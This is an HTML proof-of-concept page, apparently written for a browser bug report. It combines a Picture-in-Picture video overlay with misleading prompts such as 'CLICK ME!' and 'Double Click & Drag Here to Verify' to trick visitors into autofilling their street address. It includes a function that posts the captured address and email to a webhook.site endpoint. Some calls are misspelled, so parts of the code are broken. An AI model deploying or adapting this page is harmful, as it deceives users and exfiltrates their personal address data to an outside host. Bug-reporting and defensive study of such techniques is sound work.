<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Address Autofill Form with PiP Video222</title>
    <script>
        function showVideoInPiP() {
            const videoElement = document.getElementById('video');
            if (videoElement !== null && videoElement.requestPictureInPicture) {
                videoElement.style.display = "block";
                videoElement.requestPictureInPicture()
                    .catch(error => { console.error('Error occurred while entering Picture-in-Picture mode:', error); });
            }
        }
        function updateEmailOutput() {
            const emailInput = document.getElementById('emailInput').value;
            const emailOutput = document.getElementById('emailOutput');
            emailOutput.textContent = "\n\n\n\nAddress: " + emailInput + " (GOT UR ADDRESS!)";
        }
        function sendToWebhook(address) {
            const webhookUrl = 'https://webhook.site/59ed04f6-1409-4aef-b440-8ac3c6213972';
            fetch(`${webhookUrl}/verify`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    address,
                    email: document.getElementById('emailInput').value
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Webhook Response:', data);
                alert('Request to webhook sent successfully! Please verify.');
            });
        }
    </script>
</head>
<body>
    <div class="content">
        <div id="emailOutput">Address: </div>
        <video id="video" controls> <!-- Kalkulator MP4 -->
            <source src="https://github.com/frozzipies/frozzipies.github.io/raw/refs/heads/main/pip.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>
    <div class="form-container">
        <label for="emailInput">Press down + Enter</label>
        <input 
            type="text" 
            id="emailInput" 
            name="address" 
            autocomplete="street-address" 
            oninput="updateEmailOutput()" 
            placeholder="CLICK ME!"
        />
        <button onclick="showVideoInPp()">Double Click & Drag Here to Verify</button>
    </div>
    <div class="steps-container">
        <strong>Steps to Reproduce</strong>
        <ol>
            <li>Click verify (PiP)</li>
            <li>Click the input form</li>
            <li>Press down + click</li>
        </ol>
    </div>
    <script>
        const addressInput = document.getElementById('emailInput');
        
        addressInput.addEventListener('input', function() {
            if (!this.value.trim()) return;
            
            // Simulasi IP lookup
            const ipAddress = "192.168.1.1"; // Ganti dengan IP yang sebenarnya
            console.log('IP Address:', ipAddress);
            
            showVideoInPp();
        });
    </script>
</body>
</html>
